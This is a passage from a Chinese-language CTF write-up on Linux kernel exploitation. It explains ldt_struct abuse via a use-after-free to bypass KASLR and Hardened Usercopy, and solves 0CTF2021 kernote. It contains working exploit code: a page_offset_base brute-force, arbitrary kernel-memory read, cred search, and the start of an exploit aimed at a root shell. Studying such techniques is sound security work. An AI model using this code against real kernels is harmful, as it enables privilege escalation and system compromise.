class="line">		retval = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (bytecount &gt; LDT_ENTRY_SIZE * LDT_ENTRIES)</span><br><span class="line">		bytecount = LDT_ENTRY_SIZE * LDT_ENTRIES;</span><br><span class="line"></span><br><span class="line">	entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line">	<span class="keyword">if</span> (entries_size &gt; bytecount)</span><br><span class="line">		entries_size = bytecount;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) {</span><br><span class="line">		retval = -EFAULT;</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (entries_size != bytecount) {</span><br><span class="line">		<span class="comment">/* Zero-fill the rest and pretend we read bytecount bytes. */</span></span><br><span class="line">		<span class="keyword">if</span> (clear_user(ptr + entries_size, bytecount - entries_size)) {</span><br><span class="line">			retval = -EFAULT;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock;</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">	retval = bytecount;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">	up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>关键部分:</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) {</span><br><span class="line">	retval = -EFAULT;</span><br><span class="line">	<span class="keyword">goto</span> out_unlock;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>还是像之前一样,在write_ldt时已经通过uaf获得了ldt的读写能力,于是便可以完成任意读.<br>但任意读通常受限于KASLR.</p>
+<p>如何完成信息泄露绕过KASLR呢?可以利用copy_to_user对内核地址的检测(若不合法则返回错误码而不是panic),来不断爆破kernel .text段的基址以及page_offset_base(线性映射区基址).</p>
+<p>不过由于Hardened Usercopy的开启,当爆破到text段时会触发保护导致kernel panic.<br>好在page_offset_base + 0x9d000有secondary_startup_64函数的地址,读出来即可.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312271300827.png"></p>
+<p>还有一种绕过Hardened_usercopy的办法.将要读取的数据在内核空间中转移(从内核内核的转移)到不会触发Hardened Usercopy的地方,再读出来.<br>借用a3大神的图.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312271322473.png"></p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span></span><br><span class="line"><span class="comment"> * the new task is not running, so nothing can be installed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ldt_dup_context</span><span class="params">(<span class="keyword">struct</span> mm_struct *old_mm, <span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">  <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!old_mm)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  mutex_lock(&amp;old_mm-&gt;context.lock);</span><br><span class="line">  <span class="keyword">if</span> (!old_mm-&gt;context.ldt)</span><br><span class="line">    <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">  new_ldt = alloc_ldt_struct(old_mm-&gt;context.ldt-&gt;nr_entries);</span><br><span class="line">  <span class="keyword">if</span> (!new_ldt) {</span><br><span class="line">    retval = -ENOMEM;</span><br><span class="line">    <span class="keyword">goto</span> out_unlock;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">         new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line">  finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line">  retval = map_ldt_struct(mm, new_ldt, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (retval) {</span><br><span class="line">    free_ldt_pgtables(mm);</span><br><span class="line">    free_ldt_struct(new_ldt);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock;</span><br><span class="line">  }</span><br><span class="line">  mm-&gt;context.ldt = new_ldt;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">  mutex_unlock(&amp;old_mm-&gt;context.lock);</span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p>关键部分:</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">new_ldt = alloc_ldt_struct(old_mm-&gt;context.ldt-&gt;nr_entries);</span><br><span class="line"><span class="keyword">if</span> (!new_ldt) {</span><br><span class="line">  retval = -ENOMEM;</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">       new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br></pre></td></tr></tbody></table></figure>
+<p>流程已经非常熟悉了,uaf改old_mm-&gt;context.ldt-&gt;entries为想读的地址,拷贝到new_ldt-&gt;entries处,由于该地址是vmalloc区的合法地址,不会触发Hardened_usercopy关于代码段或跨页的保护,再使用read_ldt读出即可.</p>
+<h2 id="例题-0CTF2021-kernote"><a href="#例题-0CTF2021-kernote" class="headerlink" title="例题 0CTF2021-kernote"></a>例题 0CTF2021-kernote</h2><p>内核菜单堆,能分配0x20字节的堆块(题目使用的slab分配器最小为0x20字节).可以额外保存一个并uaf写入8字节.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312281627582.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312281626828.png"></p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kmem_cache_alloc_trace(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">gfp_t</span> flags, <span class="type">size_t</span> size)</span><br></pre></td></tr></tbody></table></figure>
+<p>在内核中小于等于0x20字节(再提一下,slab分配器最小堆块是0x20字节)的结构体中且能利用前8字节的常用有seq_operations,可以劫持控制流.但需要先获得内核地址.</p>
+<p>这里使用0x10大小的ldt_struct来完成信息泄露.爆破线性映射区的地址,并搜索cred结构(为了搜索,先 pthread_setname_np来在struct cred的comm字段写入字符串).</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LOG(<span class="string">"Starting brute dma base"</span>);</span><br><span class="line">page_offset_base = ldt_guessing_direct_mapping_area(create_uaf,<span class="number">0</span>,editNote,<span class="number">0</span>,<span class="number">0x4000000</span>);</span><br><span class="line">HEX(page_offset_base);</span><br><span class="line"></span><br><span class="line">LOG(<span class="string">"Starting to Search struct cred"</span>);</span><br><span class="line">pthread_setname_np(pthread_self(),<span class="string">"HanQi.."</span>);</span><br><span class="line">serach_config sc = {.bufferSize=<span class="number">0x8000</span>,.searchString=<span class="string">"HanQi.."</span>,.searchStringsize=<span class="number">8</span>,.debug=<span class="number">0</span>,.constraint=is_cred_comm};</span><br><span class="line">ldt_seeking_memory(editNote,<span class="number">0</span>,page_offset_base,memsearch,&amp;sc);</span><br><span class="line">cred_addr = sc.Addtional;</span><br><span class="line">HEX(cred_addr);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用了a3大神的模板</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief burte-force hitting page_offset_base by modifying ldt_struct</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param ldt_cracker function to make the ldt_struct modifiable</span></span><br><span class="line"><span class="comment"> * @param cracker_args args of ldt_cracker</span></span><br><span class="line"><span class="comment"> * @param ldt_momdifier function to modify the ldt_struct-&gt;entries</span></span><br><span class="line"><span class="comment"> * @param momdifier_args args of ldt_momdifier</span></span><br><span class="line"><span class="comment"> * @param burte_size size of each burte-force hitting</span></span><br><span class="line"><span class="comment"> * @return size_t address of page_offset_base</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">ldt_guessing_direct_mapping_area</span><span class="params">(<span class="type">void</span> *(*ldt_cracker)(<span class="type">void</span>*),</span></span><br><span class="line"><span class="params">                                        <span class="type">void</span> *cracker_args,</span></span><br><span class="line"><span class="params">                                        <span class="type">void</span> *(*ldt_momdifier)(<span class="type">void</span>*, <span class="type">size_t</span>), </span></span><br><span class="line"><span class="params">                                        <span class="type">void</span> *momdifier_args,</span></span><br><span class="line"><span class="params">                                        <span class="type">uint64_t</span> burte_size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">	<span class="type">uint64_t</span> page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line">	<span class="type">uint64_t</span> temp;</span><br><span class="line">	<span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init descriptor info */</span></span><br><span class="line">    init_desc(&amp;desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* make the ldt_struct modifiable */</span></span><br><span class="line">    ldt_cracker(cracker_args);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* leak kernel direct mapping area by modify_ldt() */</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) {</span><br><span class="line">        ldt_momdifier(momdifier_args, page_offset_base);</span><br><span class="line">        retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (retval &gt; <span class="number">0</span>) {</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (retval == <span class="number">0</span>) {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[x] no mm-&gt;context.ldt!"</span>);</span><br><span class="line">            page_offset_base = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        page_offset_base += burte_size;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> page_offset_base;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief read the contents from a specific kernel memory.</span></span><br><span class="line"><span class="comment"> * Note that we should call ldtGuessingDirectMappingArea() firstly,</span></span><br><span class="line"><span class="comment"> * and the function should be used in that caller process</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param ldt_momdifier function to modify the ldt_struct-&gt;entries</span></span><br><span class="line"><span class="comment"> * @param momdifier_args args of ldt_momdifier</span></span><br><span class="line"><span class="comment"> * @param addr address of kernel memory to read</span></span><br><span class="line"><span class="comment"> * @param res_buf buf to be written the data from kernel memory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ldt_arbitrary_read</span><span class="params">(<span class="type">void</span> *(*ldt_momdifier)(<span class="type">void</span>*, <span class="type">size_t</span>), </span></span><br><span class="line"><span class="params">                        <span class="type">void</span> *momdifier_args, <span class="type">size_t</span> addr, <span class="type">char</span> *res_buf)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> buf[<span class="number">0x8000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">	<span class="type">uint64_t</span> temp;</span><br><span class="line">    <span class="type">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init descriptor info */</span></span><br><span class="line">    init_desc(&amp;desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* modify the ldt_struct-&gt;entries to addr */</span></span><br><span class="line">    ldt_momdifier(momdifier_args, addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read data by the child process */</span></span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    <span class="keyword">if</span> (!fork()) {</span><br><span class="line">        <span class="comment">/* child */</span></span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], buf, <span class="number">0x8000</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">/* parent */</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], res_buf, <span class="number">0x8000</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief seek specific content in the memory.</span></span><br><span class="line"><span class="comment"> * Note that we should call ldtGuessingDirectMappingArea() firstly,</span></span><br><span class="line"><span class="comment"> * and the function should be used in that caller process</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param ldt_momdifier function to modify the ldt_struct-&gt;entries</span></span><br><span class="line"><span class="comment"> * @param momdifier_args args of ldt_momdifier</span></span><br><span class="line"><span class="comment"> * @param page_offset_base the page_offset_base we leakked before</span></span><br><span class="line"><span class="comment"> * @param mem_finder your own function to search on a 0x8000-bytes buf.</span></span><br><span class="line"><span class="comment"> *          It should be like `size_t func(void *args, char *buf)` and the `buf`</span></span><br><span class="line"><span class="comment"> *          is where we store the data from kernel in ldt_seeking_memory().</span></span><br><span class="line"><span class="comment"> *          The return val should be the offset of the `buf`, `-1` for failure</span></span><br><span class="line"><span class="comment"> * @param finder_args your own function's args</span></span><br><span class="line"><span class="comment"> * @return size_t kernel addr of content to find, -1 for failure</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">ldt_seeking_memory</span><span class="params">(<span class="type">void</span> *(*ldt_momdifier)(<span class="type">void</span>*, <span class="type">size_t</span>), </span></span><br><span class="line"><span class="params">                        <span class="type">void</span> *momdifier_args, <span class="type">uint64_t</span> page_offset_base,</span></span><br><span class="line"><span class="params">                        <span class="type">size_t</span> (*mem_finder)(<span class="type">void</span>*, <span class="type">char</span> *), <span class="type">void</span> *finder_args)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> buf[<span class="number">0x8000</span>];</span><br><span class="line">    <span class="type">size_t</span> search_addr, result_addr = <span class="number">-1</span>, offset;</span><br><span class="line"></span><br><span class="line">    search_addr = page_offset_base;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) {</span><br><span class="line">        ldt_arbitrary_read(ldt_momdifier, momdifier_args, search_addr, buf);</span><br><span class="line"></span><br><span class="line">        offset = mem_finder(finder_args, buf);</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) {</span><br><span class="line">            result_addr = search_addr + offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        search_addr += <span class="number">0x8000</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result_addr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>接下来只用将cred的euid,egid写为0即可.这一部分注意事项挺多.</p>
+<p>首先,由于write_ldt或进程退出会释放当前ldt_struct及其entries,而之前在搜索时我们的entries已经被修改成了一个不合法的位置,释放会导致kernel panic.所以我们不能在当前进程进行操作,而是fork出一个子进程A,且保证当前进程不会退出.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312281153655.png"></p>
+<p>第二,由于我们搜到的cred结构是当前进程(线程)的,所以最后起shell还是应该使用主进程.那么我们需要再次fork一个进程来进行修改ldt_entries进行竞争,记作B.</p>
+<p>第三,由于要让A取到B制造的uaf,需要首先绑定到同一个CPU.又由于要竞争,需要在制造uaf后将B绑定到另一个CPU(暂未验证单个CPU的多个进程能否在内核中发生竞争,之后会看些Linux进线程调度的东西).顺便提一句,制造uaf要在fork之后,否则fork过程中会使用uaf出的堆块.</p>
+<p>第四,由于内核中对0x20的堆块分配还是比较多的,经验证(指查看官方wp,笔者还未找到较好的计算方法,目前的想法是通过gdb插件dump出当前cpu_cache的free_list再比较最终获得的地址)write_ldt会分配到id为11的堆块.</p>
+<p>最后就是调整时序来提高条件竞争的命中率?(ps:经测进程间信号量在sem_post时会炸).</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>这个竞争窗口确实很短,笔者这个脚本爆了近200次才打通,一直以为哪里写错了.可以设置一次old_nr_entries为8000增大竞争时间,改了后出过一次14次打通.<br>(官方wp稳定在30-50次,应该是时序控制的问题)</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;kernelpwn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">addNote</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">{</span><br><span class="line">    ioctl(dev_fd,<span class="number">0x6667</span>,idx);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delNote</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">{</span><br><span class="line">    ioctl(dev_fd,<span class="number">0x6668</span>,idx);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chooseNote</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">{</span><br><span class="line">    ioctl(dev_fd,<span class="number">0x6666</span>,idx);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">editNote</span><span class="params">(<span class="type">size_t</span> dummy,<span class="type">size_t</span> value)</span></span><br><span class="line">{</span><br><span class="line">    ioctl(dev_fd,<span class="number">0x6669</span>,value);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_uaf</span><span class="params">(<span class="type">size_t</span> idx)</span></span><br><span class="line">{</span><br><span class="line">    addNote(idx);</span><br><span class="line">    chooseNote(idx);</span><br><span class="line">    delNote(idx);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">serach_config</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">size_t</span> bufferSize;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* searchString;</span><br><span class="line">    <span class="type">size_t</span> searchStringsize;</span><br><span class="line">    <span class="type">size_t</span> Addtional;</span><br><span class="line">    <span class="type">int</span> (*constraint)(<span class="type">size_t</span>* searchStringAddr);</span><br><span class="line">    <span class="type">int</span> debug;</span><br><span class="line">}serach_config;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">is_cred_comm</span><span class="params">(<span class="type">size_t</span>* result_addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (result_addr \</span><br><span class="line">        &amp;&amp; (result_addr[<span class="number">-2</span>] &gt; page_offset_base) \</span><br><span class="line">        &amp;&amp; (result_addr[<span class="number">-3</span>] &gt; page_offset_base) \</span><br><span class="line">        &amp;&amp; (((<span class="type">int</span>) result_addr[<span class="number">-58</span>]) == getpid()))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">memsearch</span><span class="params">(serach_config* sc,<span class="type">const</span> <span class="type">char</span>* buffer)</span> {</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* result_addr = (<span class="type">size_t</span>*)memmem(buffer,sc-&gt;bufferSize,sc-&gt;searchString,sc-&gt;searchStringsize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(sc-&gt;debug)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(result_addr)</span><br><span class="line">            HEX(result_addr);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(sc-&gt;constraint(result_addr))</span><br><span class="line">    {</span><br><span class="line">        LOG(<span class="string">"Found Target membytes"</span>);</span><br><span class="line">        sc-&gt;Addtional = result_addr[<span class="number">-2</span>];</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">char</span>*)result_addr-buffer;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> cred_addr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    setvbuf(<span 